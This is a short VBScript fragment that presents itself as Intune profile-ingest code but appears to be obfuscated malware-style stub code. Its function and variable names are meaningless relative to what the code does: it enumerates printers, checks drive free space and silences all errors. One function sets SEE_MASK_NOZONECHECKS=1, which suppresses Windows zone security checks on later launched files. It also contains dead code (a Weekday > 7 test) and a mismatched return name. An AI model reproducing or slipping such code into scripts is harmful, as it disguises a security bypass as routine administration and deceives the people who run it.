' --- Intune profile segment ingest ---
Function ExtractSyncToken()
On Error Resume Next
  Dim strPolicy43,strEntry31,blnExists5,blnValid55
  Set strPolicy43=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
  Set strEntry31=strPolicy43.ExecQuery("Select Name from Win32_Printer")
  For Each blnExists5 In strEntry31
    blnValid55=blnExists5.Name
  Next
  If Err.Number<>0 Then
    Err.Clear
    ExtractSyncToken=1
    Exit Function
  End If
  ExtractSyncToken=0
End Function

' --- Sequential profile assembly ---
Function ReadBackupCipher()
On Error Resume Next
  Dim strBlock22,strBlock45,strManifest874,intPos14
  Set strBlock22=CreateObject("Scripting.FileSystemObject")
  strBlock45=strBlock22.GetParentFolderName(WScript.ScriptFullName)
  If strBlock22.FolderExists(strBlock45) Then
    strManifest874=strBlock22.GetDriveName(strBlock45)
    If Len(strManifest874)>0 Then
      intPos14=strBlock22.GetDrive(strManifest874).FreeSpace
    End If
  End If
  If Err.Number<>0 Then
    Err.Clear
    UnpackSyncDelta=1
    Exit Function
  End If
  UnpackSyncDelta=0
End Function

If Weekday(Now) > 7 Then
  Call ReadBackupCipher()
End If

' --- Sequential profile assembly ---
Function MergeProfileDelta()
On Error Resume Next
  Dim strCacheBuffer44,blnEnabled6,strPolicyBlock7
  Set strCacheBuffer44=CreateObject("WScript.Shell")
  blnEnabled6=strCacheBuffer44.ExpandEnvironmentStrings("%TEMP%")
  strPolicyBlock7=strCacheBuffer44.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(blnEnabled6)>0 And Len(strPolicyBlock7)>0 Then
    strCacheBuffer44.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    MergeProfileDelta=1
    Exit Function
  End If
  MergeProfileDelta=0
End Function

